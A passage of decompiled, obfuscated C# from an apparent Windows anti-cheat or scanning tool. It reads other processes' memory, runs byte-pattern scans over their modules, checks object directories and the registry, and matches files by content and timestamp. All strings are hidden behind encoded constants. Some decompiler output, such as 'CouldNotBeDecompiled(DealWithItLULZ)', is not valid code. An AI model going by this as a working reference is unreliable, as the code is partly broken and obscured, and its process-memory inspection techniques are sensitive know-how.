										IntPtr intPtr3 = (IntPtr)(processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize);
										int num2 = 0;
										string string_ = Class14.String_16;
										Class57[] array5 = array4;
										int j = 0;
										while (j < array5.Length)
										{
											Class57 @class = array5[j];
											if (!(@class.String_0 == string_))
											{
												if (@class.String_0 == null || @class.String_0.Length <= 0 || !Class15.IsStringPrintable(@class.String_0) || ++num2 < 5)
												{
													j++;
													continue;
												}
												flag = true;
											}
											else
											{
												flag = true;
											}
											IL_317:
											if (!flag)
											{
												goto IL_31B;
											}
											foreach (Class57 class2 in array4)
											{
												long num3 = class2.IntPtr_1.ToInt64();
												if (num3 != 0L && (num3 < baseAddress.ToInt64() || num3 >= intPtr3.ToInt64()))
												{
													this.ProcessMemoryRegionAccessEvent(GEnum21.const_18, class2, process_1, intPtr, class2.IntPtr_1);
												}
												num3 = class2.IntPtr_2.ToInt64();
												if (num3 != 0L && (num3 < baseAddress.ToInt64() || num3 >= intPtr3.ToInt64()))
												{
													this.ProcessMemoryRegionAccessEvent(GEnum21.const_18, class2, process_1, intPtr, class2.IntPtr_2);
												}
												if (class2.String_0 != string.Empty)
												{
													this.gclass51_0.List_9.Add(class2.String_0);
												}
											}
											goto IL_3FF;
										}
										goto IL_317;
									}
								}
								IL_31B:
								if (flag)
								{
									break;
								}
							}
							IL_3FF:;
						}
						if (flag)
						{
							break;
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_3, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
	}

	// Token: 0x0600061C RID: 1564 RVA: 0x0005D044 File Offset: 0x0005B244
	private void processmodules2(Process process_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				List<GClass53> list = new List<GClass53>
				{
					new GClass53(Class14.Byte_60, Class14.String_48, Class14.int_343),
					new GClass53(Class14.Byte_33, Class14.String_43, Class14.int_307),
					new GClass53(Class14.Byte_38, Class14.String_49, Class14.int_118),
					new GClass53(Class14.Byte_14, Class14.String_210, Class14.int_116),
					new GClass53(Class14.Byte_2, Class14.String_129, Class14.int_46),
					new GClass53(Class14.Byte_19, Class14.String_5, Class14.int_34),
					new GClass53(Class14.Byte_37, Class14.String_171, Class14.int_340),
					new GClass53(Class14.Byte_44, Class14.String_156, Class14.int_196),
					new GClass53(Class14.Byte_43, Class14.String_46, Class14.int_192),
					new GClass53(Class14.Byte_49, Class14.String_197, Class14.int_257),
					new GClass53(Class14.Byte_36, Class14.String_128, Class14.int_37),
					new GClass53(Class14.Byte_63, Class14.String_110, Class14.int_219),
					new GClass53(Class14.Byte_5, Class14.String_196, Class14.int_296),
					new GClass53(Class14.Byte_56, Class14.String_201, Class14.int_6),
					new GClass53(Class14.Byte_4, Class14.String_195, Class14.int_205)
				};
				ProcessModule[] array = new ProcessModule[]
				{
					GClass49.GetModuleByName(process_1, Class14.String_235),
					GClass49.GetModuleByName(process_1, Class14.String_116),
					process_1.MainModule
				};
				IntPtr intptr_ = IntPtr.Zero;
				IntPtr intPtr2 = IntPtr.Zero;
				byte[] array2 = new byte[IntPtr.Size];
				uint num = 0U;
				bool flag = false;
				foreach (ProcessModule processModule in array)
				{
					if (processModule != null)
					{
						if (this.SafeGetBool())
						{
							break;
						}
						flag = false;
						foreach (GClass53 gclass in list)
						{
							intPtr2 = MAIN.PerformAOBScan(intPtr, processModule.BaseAddress, (IntPtr)processModule.ModuleMemorySize, gclass.Byte_0, gclass.String_0, true, gclass.Int32_0[0], 4, 0U);
							if (intPtr2 != IntPtr.Zero && !this.SafeGetBool() && GClass45.ReadProcessMemory(intPtr, intPtr2, array2, (uint)array2.Length, ref num) && (ulong)num == (ulong)((long)array2.Length))
							{
								intptr_ = (IntPtr)BitConverter.ToInt32(array2, 0);
								GClass62[] array4 = GClass62.smethod_2(intPtr, intptr_);
								if (array4 != null)
								{
									IntPtr baseAddress = processModule.BaseAddress;
									IntPtr intPtr3 = (IntPtr)(processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize);
									int num2 = 0;
									string string_ = Class14.String_169;
									foreach (GClass62 gclass2 in array4)
									{
										if (gclass2.String_0 == string_)
										{
											flag = true;
											break;
										}
										if (gclass2.String_0 != null && gclass2.String_0.Length > 0 && Class15.IsStringPrintable(gclass2.String_0) && ++num2 >= 5)
										{
											flag = true;
											break;
										}
									}
									if (flag)
									{
										foreach (GClass62 gclass3 in array4)
										{
											long num3 = gclass3.IntPtr_0.ToInt64();
											if (num3 != 0L && (baseAddress.ToInt64() > num3 || num3 >= intPtr3.ToInt64()))
											{
												string text = GClass49.CouldNotBeDecompiled(DealWithItLULZ)(process_1, gclass3.IntPtr_0);
												GEnum48 genum48_;
												if (text == null)
												{
													text = GClass45.GetMappedFileNameInfo(intPtr, gclass3.IntPtr_0);
													if (text == null)
													{
														text = string.Empty;
													}
													genum48_ = GEnum48.const_4;
												}
												else
												{
													genum48_ = GEnum48.const_1;
												}
												string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, gclass3.IntPtr_0);
												string string_2 = string.Format(<Module>.DeserializeFromByteArrayV2<string>(3443990304U), gclass3.String_0, memoryRegionInfo);
												GClass41 gclass4 = this.LogEvent(GEnum21.const_19, string_2, -1, -1L, GEnum23.const_0);
												long int64_;
												if (text != null && text.Length > 0)
												{
													int64_ = this.HandleFileAccessRights(gclass4.GEnum21_0, genum48_, text.ToString(), null, GEnum51.const_2);
												}
												else
												{
													int64_ = -1L;
												}
												gclass4.Int64_0 = int64_;
											}
											if (gclass3.String_0 != string.Empty)
											{
												this.gclass51_0.List_10.Add(gclass3.String_0);
											}
										}
										break;
									}
								}
							}
							if (flag)
							{
								break;
							}
						}
						if (flag)
						{
							break;
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_4, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
	}

	// Token: 0x0600061D RID: 1565 RVA: 0x0005D5B8 File Offset: 0x0005B7B8
	private void validate_checks_generic_detection(Process process_1)
	{
		try
		{
			this.ProcessFileAccessForPattern(process_1.MainModule.ModuleName, process_1.MainModule.FileName, GEnum51.const_2);
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_18, ex.ToString());
		}
		try
		{
			this.ProcessFileAccessForPattern(Class14.String_180, Class14.String_180, GEnum51.const_1);
		}
		catch (Exception ex2)
		{
			this.AddToErrorLog(GEnum22.const_18, ex2.ToString());
		}
		try
		{
			this.ProcessFileAccessForPattern(Class14.String_127, Class14.String_127, GEnum51.const_1);
		}
		catch (Exception ex3)
		{
			this.AddToErrorLog(GEnum22.const_18, ex3.ToString());
		}
		try
		{
			this.ProcessFileAccessForPattern(Class14.String_114, Class14.String_114, GEnum51.const_1);
		}
		catch (Exception ex4)
		{
			this.AddToErrorLog(GEnum22.const_18, ex4.ToString());
		}
	}

	// Token: 0x0600061E RID: 1566
	private bool ProcessFileAccessForPattern(string string_6, string string_7 = null, GEnum51 genum51_0 = GEnum51.const_2)
	{
		bool flag = false;
		if (string_6 != null && !this.SafeGetBool())
		{
			bool result;
			try
			{
				string text = Path.Combine(Path.GetDirectoryName(Environment.GetFolderPath(Environment.SpecialFolder.System)), Class14.String_109);
				string[] array = null;
				array = Class15.FindFilesByPattern(text, Class14.String_207, false);
				if (array != null && array.Length != 0 && !this.SafeGetBool())
				{
					string text2 = null;
					if (string_7 != null)
					{
						text2 = Path.GetFullPath(string_7).ToLowerInvariant();
					}
					string value = string_6.ToLowerInvariant() + <Module>.DeserializeFromByteArray<string>(3133938773U);
					new List<string>();
					bool flag2 = false;
					string[] array2 = new string[]
					{
						Class14.String_2,
						Class14.String_13,
						Class14.String_51,
						Class14.String_136,
						Class14.String_63,
						Class14.String_106
					};
					string b = Class14.String_143.ToLowerInvariant();
					int num = 0;
					while (num < array.Length && !this.SafeGetBool())
					{
						try
						{
							string text3 = Path.GetFileName(array[num]);
							if (text3.ToLowerInvariant().StartsWith(value))
							{
								GInterface0 ginterface = GClass5.smethod_2(array[num]);
								if (ginterface != null && ginterface.Prop_2 != null && ginterface.Prop_1 != null)
								{
									List<MAIN.Class17> list = new List<MAIN.Class17>();
									List<string> list2 = new List<string>();
									for (int i = 0; i < ginterface.Prop_1.Count; i++)
									{
										if (ginterface.Prop_1[i].String_1 != null)
										{
											MAIN.Class17 @class = new MAIN.Class17();
											@class.String_0 = ginterface.Prop_1[i].String_1;
											@class.String_1 = @class.String_0.ToLowerInvariant();
											@class.String_2 = ginterface.Prop_1[i].String_0;
											@class.String_3 = this.get_driveinfo(@class.String_2);
											@class.String_4 = @class.String_3.ToLowerInvariant();
											if (@class.String_3 != null)
											{
												list.Add(@class);
											}
											else
											{
												list2.Add(@class.String_0);
											}
										}
									}
									if (list.Count != 0)
									{
										flag2 = false;
										List<string> list3 = new List<string>();
										for (int i = 0; i < ginterface.Prop_2.Count; i++)
										{
											for (int j = 0; j < list.Count; j++)
											{
												if (list[j].String_3 != null && ginterface.Prop_2[i].StartsWith(list[j].String_0))
												{
													text3 = ginterface.Prop_2[i].Replace(list[j].String_0, list[j].String_3);
													if (text3 != null)
													{
														string text4;
														try
														{
															text4 = Path.GetFullPath(text3);
															goto IL_31C;
														}
														catch (PathTooLongException)
														{
															text4 = text3;
															goto IL_31C;
														}
														catch (NotSupportedException)
														{
															text4 = Class5.smethod_2(text3);
															goto IL_31C;
														}
														goto IL_2C2;
														IL_2EF:
														list3.Add(text4);
														if (!flag2 && (text2 == null || text4.ToLowerInvariant() == text2))
														{
															flag2 = true;
															break;
														}
														break;
														IL_2C2:
														try
														{
															if (!(new DirectoryInfo(text4).Name.ToLowerInvariant() == b))
															{
																goto IL_2EF;
															}
														}
														catch
														{
															goto IL_2EF;
														}
														goto IL_2E4;
														IL_31C:
														if (text4.Length == 8)
														{
															goto IL_2C2;
														}
														goto IL_2EF;
													}
												}
												IL_2E4:;
											}
										}
										if (flag2)
										{
											foreach (string string_8 in list2)
											{
												this.LogEvent(GEnum21.const_17, string_8, -1, -1L, GEnum23.const_0);
											}
											foreach (string text5 in list3)
											{
												string text6 = Path.GetExtension(text5);
												if (text6 != null)
												{
													text6 = text6.ToLowerInvariant();
													int num2 = 0;
													while (num2 < array2.Length && !(text6 == array2[num2]))
													{
														num2++;
													}
													if (num2 < array2.Length || GClass17.IsFileExecutable(text5, false))
													{
														this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_6, text5, null, genum51_0);
													}
												}
											}
										}
									}
								}
							}
						}
						catch (GException2)
						{
						}
						catch (GException0)
						{
						}
						catch (ArgumentOutOfRangeException)
						{
						}
						catch (NullReferenceException)
						{
						}
						catch (IOException)
						{
						}
						catch (Exception ex)
						{
							this.AddToErrorLog(GEnum22.const_20, ex.ToString());
						}
						num++;
					}
					return true;
				}
				result = flag;
			}
			catch (Exception ex2)
			{
				this.AddToErrorLog(GEnum22.const_19, ex2.ToString());
				return flag;
			}
			return result;
		}
		return flag;
	}

	// Token: 0x0600061F RID: 1567 RVA: 0x0005DC24 File Offset: 0x0005BE24
	private void check_registry_intact_flag_detect()
	{
		IntPtr intPtr = IntPtr.Zero;
		bool flag = false;
		try
		{
			int num = Marshal.SizeOf(typeof(GClass45.GStruct17));
			int num2 = 0;
			intPtr = Marshal.AllocHGlobal(num);
			Marshal.StructureToPtr(new GClass45.GStruct17
			{
				uint_0 = (uint)num
			}, intPtr, false);
			GClass45.NtQuerySystemInformation(103, intPtr, num, ref num2);
			if (num != num2)
			{
				flag = true;
			}
			else
			{
				GClass45.GStruct17 gstruct = (GClass45.GStruct17)Marshal.PtrToStructure(intPtr, typeof(GClass45.GStruct17));
				this.gclass51_0.GEnum34_0 = gstruct.genum34_0;
			}
		}
		catch
		{
			flag = true;
		}
		finally
		{
			if (flag)
			{
				string stringValueFromRegistry = RegistryStuff.GetStringValueFromRegistry(Registry.LocalMachine, Class14.String_150, Class14.String_133);
				if (stringValueFromRegistry != null)
				{
					if (stringValueFromRegistry.ToLowerInvariant().Contains(Class14.String_166))
					{
						this.gclass51_0.GEnum34_0 = GClass45.GEnum34.const_2;
					}
				}
				else
				{
					this.gclass51_0.GEnum34_0 = (GClass45.GEnum34)2147483648U;
				}
			}
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
	}

	// Token: 0x06000620 RID: 1568 RVA: 0x0005DD34 File Offset: 0x0005BF34
	private void regex_text()
	{
		try
		{
			List<string> list = GClass45.ListDirectoryObjects(Class14.String_60, 1024);
			Regex regex = new Regex(Class14.String_209, RegexOptions.IgnoreCase);
			Regex regex2 = new Regex(Class14.String_165, RegexOptions.None);
			Regex regex3 = new Regex(Class14.String_42, RegexOptions.None);
			Regex regex4 = new Regex(Class14.String_98, RegexOptions.None);
			Regex regex5 = new Regex(Class14.String_1, RegexOptions.None);
			Regex regex6 = new Regex(Class14.String_68, RegexOptions.None);
			Regex regex7 = new Regex(Class14.String_137, RegexOptions.None);
			Regex regex8 = new Regex(Class14.String_118, RegexOptions.None);
			string[] string_ = Class14.String_96;
			foreach (string text in list)
			{
				if (!regex.IsMatch(text) && !regex2.IsMatch(text) && !regex3.IsMatch(text) && !regex4.IsMatch(text) && !regex5.IsMatch(text) && !regex7.IsMatch(text) && !regex8.IsMatch(text) && !regex6.IsMatch(text) && (text.Length < 2 || text[1] != ':'))
				{
					int num = 0;
					while (num < string_.Length && !(string_[num] == text))
					{
						num++;
					}
					if (num >= string_.Length)
					{
						string item = Class15.SanitizeString(text);
						if (!Class15.StringExistsInList(this.gclass51_0.List_6, item, false))
						{
							this.gclass51_0.List_6.Add(item);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_6, ex.ToString());
		}
	}

	// Token: 0x06000621 RID: 1569
	private void SanitizeDirectoryObjects()
	{
		try
		{
			foreach (string text in GClass45.ListDirectoryObjects(Class14.String_104, 1024))
			{
				this.gclass51_0.List_7.Add(Class15.SanitizeString(text));
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_7, ex.ToString());
		}
	}

	// Token: 0x06000622 RID: 1570 RVA: 0x0005DF98 File Offset: 0x0005C198
	private void enum_process(Process process_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			intPtr = GClass45.OpenProcess(1104, false, process_1.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				new List<GClass45.GClass48>();
				List<GClass45.GStruct16> list = GClass45.smethod_3(process_1);
				string string_ = Class14.String_11;
				List<string> list_ = new List<string>
				{
					string_
				};
				for (int i = 0; i < list.Count; i++)
				{
					GClass45.GClass48 gclass = GClass45.smethod_2(list[i], intPtr, list_);
					if (gclass != null && gclass.String_0 != null)
					{
						this.gclass51_0.List_5.Add(Class15.SanitizeString(gclass.String_0));
					}
				}
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_17, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
	}

	// Token: 0x06000623 RID: 1571 RVA: 0x0005E084 File Offset: 0x0005C284
	private GClass41 filestream(string string_6)
	{
		FileStream fileStream = null;
		List<GClass40> list = GClass40.smethod_0(this.string_4);
		try
		{
			try
			{
				fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.Read);
			}
			catch
			{
				fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			}
			using (StreamReader streamReader = new StreamReader(fileStream))
			{
				string text;
				while ((text = streamReader.ReadLine()) != null)
				{
					if (text.Length != 0)
					{
						string text2 = text.ToLower();
						int num = 0;
						foreach (GClass40 gclass in list)
						{
							if ((gclass.GEnum20_0 & GEnum20.const_2) == GEnum20.const_2)
							{
								if ((gclass.GEnum20_0 & GEnum20.const_4) == GEnum20.const_4)
								{
									if (gclass.String_0 != null && !(gclass.String_0 == string.Empty))
									{
										if (!text2.Contains(gclass.String_0))
										{
											num++;
											continue;
										}
										string string_7 = string_6 + <Module>.DeserializeFromByteArray<string>(3617197183U) + gclass.String_0.Trim().Trim(new char[]
										{
											'\n'
										}).Trim(new char[1]);
										return this.LogEvent(GEnum21.const_10, string_7, num, -1L, GEnum23.const_0);
									}
								}
							}
							num++;
						}
					}
				}
			}
		}
		finally
		{
			if (fileStream != null)
			{
				fileStream.Close();
			}
		}
		return null;
	}

	// Token: 0x06000624 RID: 1572 RVA: 0x0005E240 File Offset: 0x0005C440
	private GClass41 timestamper(DateTime dateTime_0, int int_2, string string_6, bool bool_3 = false)
	{
		if (string_6 == null)
		{
			return null;
		}
		string[] array = string_6.Split(new char[]
		{
			'|'
		});
		string text = null;
		string searchPattern = null;
		string value = null;
		if (array.Length == 4)
		{
			text = array[0];
			searchPattern = array[1];
			value = array[2];
			try
			{
				int int_3 = int.Parse(array[3]);
				foreach (string text2 in Class15.GetFilesRecursivelyWithDepth(text, searchPattern, int_3))
				{
					if (File.Exists(text2))
					{
						try
						{
							if (Class15.FileToString(text2).IndexOf(value) > -1)
							{
								try
								{
									FileInfo fileInfo = new FileInfo(text2);
									if (!(fileInfo.CreationTime >= dateTime_0) && !(fileInfo.LastAccessTime >= dateTime_0) && !(fileInfo.LastWriteTime >= dateTime_0))
									{
										return this.LogEvent(GEnum21.const_16, text2 + <Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U) + string_6, int_2, -1L, GEnum23.const_0);
									}
									return this.LogEvent(GEnum21.const_15, text2 + <Module>.DeserializeFromByteArray3<string>(4083566554U) + string_6, int_2, -1L, GEnum23.const_0);
								}
								catch
								{
									return this.LogEvent(GEnum21.const_16, text2 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
								}
							}
						}
						catch
						{
						}
					}
				}
				goto IL_740;
			}
			catch
			{
				goto IL_740;
			}
		}
		GClass41 result;
		if (array.Length == 3)
		{
			text = array[0];
			searchPattern = array[1];
			value = array[2];
			if (!(text == Class14.String_54) && !(text == Class14.String_231))
			{
				(new string[1])[0] = text;
				try
				{
					foreach (string text3 in Directory.GetFiles(text, searchPattern))
					{
						if (File.Exists(text3))
						{
							try
							{
								if (Class15.FileToString(text3).IndexOf(value) > -1)
								{
									try
									{
										FileInfo fileInfo2 = new FileInfo(text3);
										if (!(fileInfo2.CreationTime >= dateTime_0) && !(fileInfo2.LastAccessTime >= dateTime_0) && !(fileInfo2.LastWriteTime >= dateTime_0))
										{
											return this.LogEvent(GEnum21.const_16, text3 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
										}
										return this.LogEvent(GEnum21.const_15, text3 + <Module>.DeserializeFromByteArrayV2<string>(1038036101U) + string_6, int_2, -1L, GEnum23.const_0);
									}
									catch
									{
										return this.LogEvent(GEnum21.const_16, text3 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
									}
								}
							}
							catch
							{
							}
						}
					}
					goto IL_740;
				}
				catch (SecurityException)
				{
					return this.LogEvent(GEnum21.const_16, string_6, int_2, -1L, GEnum23.const_0);
				}
				catch (Exception)
				{
					return null;
				}
			}
			if (RegistryStuff.CheckRegistryKeyValueExists(text, searchPattern, value) && bool_3)
			{
				return this.LogEvent(GEnum21.const_16, string_6, int_2, -1L, GEnum23.const_0);
			}
			goto IL_740;
		}
		else if (array.Length == 2)
		{
			text = array[0];
			searchPattern = array[1];
			if (!(text == Class14.String_54) && !(text == Class14.String_231))
			{
				List<string> list = new List<string>();
				try
				{
					foreach (string item in Directory.GetFiles(text, searchPattern))
					{
						list.Add(item);
					}
				}
				catch (SecurityException)
				{
					return this.LogEvent(GEnum21.const_16, string_6, int_2, -1L, GEnum23.const_0);
				}
				catch (Exception)
				{
					return null;
				}
				try
				{
					foreach (string item2 in Directory.GetDirectories(text, searchPattern))
					{
						list.Add(item2);
					}
				}
				catch (SecurityException)
				{
					return this.LogEvent(GEnum21.const_16, string_6, int_2, -1L, GEnum23.const_0);
				}
				catch (Exception)
				{
					return null;
				}
				using (List<string>.Enumerator enumerator = list.GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string text4 = enumerator.Current;
						if (!Directory.Exists(text4))
						{
							if (!File.Exists(text4))
							{
								continue;
							}
							try
							{
								FileInfo fileInfo3 = new FileInfo(text4);
								if (!(fileInfo3.CreationTime >= dateTime_0) && !(fileInfo3.LastAccessTime >= dateTime_0) && !(fileInfo3.LastWriteTime >= dateTime_0))
								{
									return this.LogEvent(GEnum21.const_16, text4 + <Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U) + string_6, int_2, -1L, GEnum23.const_0);
								}
								return this.LogEvent(GEnum21.const_15, text4 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
							}
							catch
							{
								return this.LogEvent(GEnum21.const_16, text4 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
							}
						}
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(text4);
							if (!(directoryInfo.CreationTime >= dateTime_0) && !(directoryInfo.LastAccessTime >= dateTime_0) && !(directoryInfo.LastWriteTime >= dateTime_0))
							{
								return this.LogEvent(GEnum21.const_16, text4 + <Module>.DeserializeFromByteArray3<string>(4083566554U) + string_6, int_2, -1L, GEnum23.const_0);
							}
							return this.LogEvent(GEnum21.const_15, text4 + <Module>.DeserializeFromByteArray2<string>(3237939336U) + string_6, int_2, -1L, GEnum23.const_0);
						}
						catch
						{
							return this.LogEvent(GEnum21.const_16, text4 + <Module>.DeserializeFromByteArray<string>(3617197183U) + string_6, int_2, -1L, GEnum23.const_0);
						}
						IL_579:
						goto IL_740;
					}
					goto IL_579;
				}
			}
			if (bool_3 && RegistryStuff.CheckRegistryKeyValueExists(text, searchPattern, null))
			{
				return this.LogEvent(GEnum21.const_16, string_6, int_2, -1L, GEnum23.const_0);
			}
			goto IL_740;
		}
		else
		{
			if (array.Length != 1)
			{
				goto IL_740;
			}
			text = array[0];
			if (Directory.Exists(text))
			{
				try
				{
					DirectoryInfo directoryInfo2 = new DirectoryInfo(text);
					if (!(directoryInfo2.CreationTime >= dateTime_0) && !(directoryInfo2.LastAccessTime >= dateTime_0) && !(directoryInfo2.LastWriteTime >= dateTime_0))
					{
						return this.LogEvent(GEnum21.const_16, text + <Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U) + string_6, int_2, -1L, GEnum23.const_0);
					}
					return this.LogEvent(GEnum21.const_15, text + <Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U) + string_6, int_2, -1L, GEnum23.const_0);
				}
				catch
				{
					return this.LogEvent(GEnum21.const_16, text + <Module>.DeserializeFromByteArray3<string>(4083566554U) + string_6, int_2, -1L, GEnum23.const_0);
				}
			}
			if (!File.Exists(text))
			{
				goto IL_740;
			}
			try
			{
				FileInfo fileInfo4 = new FileInfo(text);
				if (!(fileInfo4.CreationTime >= dateTime_0) && !(fileInfo4.LastAccessTime >= dateTime_0) && !(fileInfo4.LastWriteTime >= dateTime_0))
				{
					result = this.LogEvent(GEnum21.const_16, text + <Module>.DeserializeFromByteArray2<string>(3237939336U) + string_6, int_2, -1L, GEnum23.const_0);
				}
				else
				{
					result = this.LogEvent(GEnum21.const_15, text + <Module>.DeserealizeFromByteArrayV2_1<string>(1214359125U) + string_6, int_2, -1L, GEnum23.const_0);
				}
			}
			catch
			{
				result = this.LogEvent(GEnum21.const_16, text + <Module>.DeserializeFromByteArray3<string>(4083566554U) + string_6, int_2, -1L, GEnum23.const_0);
			}
		}
		return result;
		IL_740:
		return null;
	}

	// Token: 0x06000625 RID: 1573 RVA: 0x0005EB14 File Offset: 0x0005CD14
	public bool timestamp_proc(Process process_1)
	{
		if (this.string_4 != null && this.string_4.Length != 0)
		{
			bool result;
			try
			{
				List<GClass40> list = GClass40.smethod_0(this.string_4);
				string string_ = Class14.String_158;
				string string_2 = Class14.String_148;
				string string_3 = Class14.String_65;
				string string_4 = Class14.String_6;
				string string_5 = Class14.String_224;
				int num = 0;
				while (num < this.gclass51_0.List_1.Count && !this.SafeGetBool())
				{
					string directoryName;
					string fileNameWithoutExtension;
					try
					{
						directoryName = Path.GetDirectoryName(this.gclass51_0.List_1[num].String_1);
						fileNameWithoutExtension = Path.GetFileNameWithoutExtension(this.gclass51_0.List_1[num].String_1);
					}
					catch
					{
						goto IL_1A4;
					}
					goto IL_A0;
					IL_1A4:
					num++;
					continue;
					IL_A0:
					for (int i = 0; i < list.Count; i++)
					{
						GClass40 gclass = list[i];
						if ((gclass.GEnum20_0 & GEnum20.const_2) == GEnum20.const_2)
						{
							if ((gclass.GEnum20_0 & GEnum20.const_6) == GEnum20.const_6)
							{
								if (gclass.String_0 != null && !(gclass.String_0 == string.Empty))
								{
									if (gclass.String_0[0] == '%')
									{
										string text;
										if ((this.gclass51_0.List_1[num].GEnum48_0 & GEnum48.const_1) == GEnum48.const_1 && gclass.String_0.StartsWith(string_))
										{
											text = gclass.String_0.Replace(string_, directoryName);
											text = text.Replace(string_2, fileNameWithoutExtension);
										}
										else
										{
											if (!gclass.String_0.StartsWith(string_3))
											{
												goto IL_194;
											}
											text = gclass.String_0.Replace(string_3, directoryName);
											text = text.Replace(string_4, fileNameWithoutExtension);
										}
										this.timestamper(this.gclass51_0.DateTime_0, i, text, false);
									}
								}
							}
						}
						IL_194:;
					}
					goto IL_1A4;
				}
				for (int i = 0; i < list.Count; i++)
				{
					GClass40 gclass = list[i];
					if ((gclass.GEnum20_0 & GEnum20.const_2) == GEnum20.const_2)
					{
						if ((gclass.GEnum20_0 & GEnum20.const_6) == GEnum20.const_6 && gclass.String_0 != null && !(gclass.String_0 == string.Empty))
						{
							string text;
							if (gclass.String_0.StartsWith(string_5))
							{
								text = gclass.String_0.Replace(string_5, string_5);
							}
							else
							{
								if (gclass.String_0.StartsWith(string_) || gclass.String_0.StartsWith(string_3))
								{
									goto IL_271;
								}
								text = Environment.ExpandEnvironmentVariables(gclass.String_0);
							}
							this.timestamper(this.gclass51_0.DateTime_0, i, text, true);
						}
					}
					IL_271:;
				}
				return true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
		return false;
	}

	// Token: 0x06000626 RID: 1574
	private void HandleFileMatchingPattern(string string_6)
	{
		string text = (<Module>.DeserializeFromByteArray3<string>(1894906912U) + string_6 + Class14.String_51).ToLowerInvariant();
		string str = Class14.String_2;
		List<GClass44> list = new List<GClass44>();
		int num = 0;
		while (num < this.gclass51_0.List_1.Count && !this.SafeGetBool())
		{
			try
			{
				if (this.gclass51_0.List_1[num].String_1.ToLowerInvariant().EndsWith(text))
				{
					string text2 = this.gclass51_0.List_1[num].String_1.Substring(0, this.gclass51_0.List_1[num].String_1.Length - text.Length) + str;
					if (File.Exists(text2))
					{
						GClass44 item = new GClass44(text2, this.gclass51_0.List_1[num].GEnum48_0, this.bool_2, this.gclass51_0.List_1[num].GEnum51_0, false);
						list.Add(item);
					}
				}
			}
			catch
			{
			}
			num++;
		}
		num = 0;
		while (num < list.Count && !this.SafeGetBool())
		{
			this.ManageFileEntries(list[num]);
			num++;
		}
	}

	// Token: 0x06000627 RID: 1575
	private void AoBScan()
	{
		string[] array = new string[5];
		array[0] = Class14.String_24;
		array[1] = Class14.String_186;
		array[2] = Class14.String_58;
		array[3] = Class14.String_37;
		string[] array2 = array;
		Stopwatch stopwatch = new Stopwatch();
		int num;
		if (this.gclass51_0.GClass55_0 != null && this.gclass51_0.GClass55_0.List_0.Count > 0)
		{
			stopwatch.Start();
			List<string> list = new List<string>();
			num = 0;
			while (num < this.gclass51_0.List_1.Count && !this.SafeGetBool())
			{
				try
				{
					string directoryName = Path.GetDirectoryName(this.gclass51_0.List_1[num].String_1);
					if (!Class15.StringExistsInList(list, directoryName, false))
					{
						list.Add(directoryName);
					}
				}
				catch
				{
				}
				num++;
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			if (!Class15.StringExistsInList(list, folderPath, false))
			{
				list.Add(folderPath);
			}
			stopwatch.Stop();
			stopwatch.Reset();
			stopwatch.Start();
			List<GClass54> list_ = this.gclass51_0.GClass55_0.List_0;
			num = 0;
			while (num < list_.Count && !this.SafeGetBool())
			{
				GClass54 gclass = list_[num];
				string text = gclass.String_0;
				if (text.Length > 0)
				{
					int num2 = 0;
					while (num2 < list.Count && !this.SafeGetBool())
					{
						try
						{
							string string_ = Path.Combine(list[num2], text);
							if (GClass39.smethod_3(string_))
							{
								long num3 = this.HandleFileAccessRights(GEnum21.const_0, GEnum48.const_7, string_, null, GEnum51.const_2);
								if (num3 != -1L)
								{
									if (gclass.List_0.IndexOf(num3) == -1)
									{
										gclass.List_0.Add(num3);
									}
								}
							}
							goto IL_1CB;
						}
						catch
						{
							goto IL_1CB;
						}
						break;
						IL_1CB:
						num2++;
					}
				}
				num++;
			}
			stopwatch.Stop();
			stopwatch.Reset();
		}
		if (this.string_5 == Class14.String_80)
		{
			this.HandleFileMatchingPattern(Class14.String_80);
		}
		else
		{
			this.HandleFileMatchingPattern(Class14.String_83);
		}
		uint num4 = 11U;
		stopwatch.Start();
		num = 0;
		while (num < this.gclass51_0.List_1.Count && !this.SafeGetBool())
		{
			this.gclass51_0.List_1[num].method_3();
			if ((this.gclass51_0.List_1[num].GEnum48_0 & (GEnum48)num4) != GEnum48.const_0)
			{
				string path = this.gclass51_0.List_1[num].String_1;
